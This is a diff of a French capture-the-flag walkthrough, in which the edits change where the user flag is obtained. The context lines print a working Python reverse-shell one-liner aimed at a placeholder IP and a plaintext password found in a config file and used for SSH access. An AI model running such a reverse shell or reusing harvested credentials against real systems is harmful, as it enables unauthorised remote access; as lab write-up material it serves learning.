@@ -34,7 +34,7 @@ en plus de l’url. On utilise un reverse shell python:
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ip",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
 ```
 
-On est connecté en tant que ruby et on obtient le user flag
+On est connecté en tant que ruby
 
 Dans le dossier caché .bundle dans le home de ruby, on trouve le mot de passe de henry dans le fichier config:
 
@@ -42,7 +42,7 @@ Dans le dossier caché .bundle dans le home de ruby, on trouve le mot de passe d
 "henry:Q3c1AqGHtoI0aXAYFH"
 ```
 
-On peut alors se connecter en SSH !
+On peut alors se connecter en SSH et obtenir le flag user
 
 Il y a un SETUID énoncé comme tel : 
 
